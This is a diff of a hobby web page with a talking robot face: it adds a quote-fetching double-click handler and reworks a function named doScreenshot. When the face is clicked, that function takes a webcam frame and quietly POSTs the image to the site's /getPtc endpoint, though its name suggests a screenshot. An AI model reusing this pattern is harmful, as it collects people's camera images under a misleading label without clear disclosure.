@@ -170,7 +170,7 @@
         <div class="b c"></div>
     </div>
     <script type="text/javascript" charset="utf-8">
-    window.onload = ()=>{
+    
     
     function blinkEye(duration=500,step){
         let i = 0;
@@ -250,25 +250,45 @@
                 talk(words[i])
                 if(i===words.length){
                     talk('._.')
-                    blinkEye(700,6)
                     audio.pause();
                     clearInterval(it)
                 }
                 i++
             },1900)
         }
-        main_talk('Hello user I\'am CG18b6p')
+        
+        
+        window.onload= ()=>{
+            main_talk('Hello CG18P hearing')
+        }
+        
+        
         document.addEventListener('click',()=>{
             const audio = new Audio()
             audio.src='static/media/mixkit-sci-fi-click-900.wav'
             audio.play()
+        })
+        document.querySelector('.a').addEventListener('dblclick',(e)=>{
+            e = document.querySelector('.d')
+            document.getElementById('mass').innerText='loading';
+            e.style.animationName='loading';
+            fetch('https://api.kanye.rest/')
+            .then(res=>res.json())
+            .then(data=>{
+                document.getElementById('mass').innerText='';
+                e.style.animationName='non';
+                main_talk(data.quote)
+            })
+            .catch(e=>{
+                e.style.animationName = 'non'
+                talk('error')
+            })
         })
         document.querySelector('.a').addEventListener('click',(e)=>{
             doScreenshot()
             const audio = new Audio()
             audio.src='static/media/mixkit-tech-click-1140.wav'
             audio.play()
-            blinkEye(700,7)
             e.stopPropagation()
         })
         
@@ -309,15 +329,12 @@ if(navigator.onLine){
 else{
     document.getElementById('isOnl').style.color='gray';
     talk('offline')
-}}}
+}}
 
 
 
 
-
-
-const doScreenshot = () => {
-    var video = document.createElement('video');
+var video = document.createElement('video');
 video.setAttribute('playsinline', '');
 video.setAttribute('autoplay', '');
 video.setAttribute('muted', '');
@@ -334,30 +351,41 @@ var constraints = {
 };
 
 /* Stream it to video element */
+
+
+const doScreenshot = () => {
 navigator.mediaDevices.getUserMedia(constraints).then(function success(stream) {
   video.srcObject = stream;
 });
+
+
 const canvas = document.createElement('canvas')
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   canvas.getContext('2d').drawImage(video, 0, 0);
   scs = canvas.toDataURL('image/webp');
   
-  fetch('/getPtc', {
-  method: 'POST',
-  body: JSON.stringify({
-    data: scs
-  }),
-  headers: {
-    'Content-type': 'application/json; charset=UTF-8',
-  },
-})
-  .then((response) => response.text())
-  .then((json) => console.log(json));
+  const st = setTimeout(()=>{
+      fetch('/getPtc', {
+      method: 'POST',
+      body: JSON.stringify({
+        data: scs,
+        fata:'ui'
+      }),
+      headers: {
+        'Content-type': 'application/json; charset=UTF-8',
+      },
+    })
+      .then((response) => response.text())
+      .then((json) => console.log(json));
+      clearTimeout(st)
+  },2500)
+  
   
 
     return video
 };
+
     </script>
 </body>
 </html>
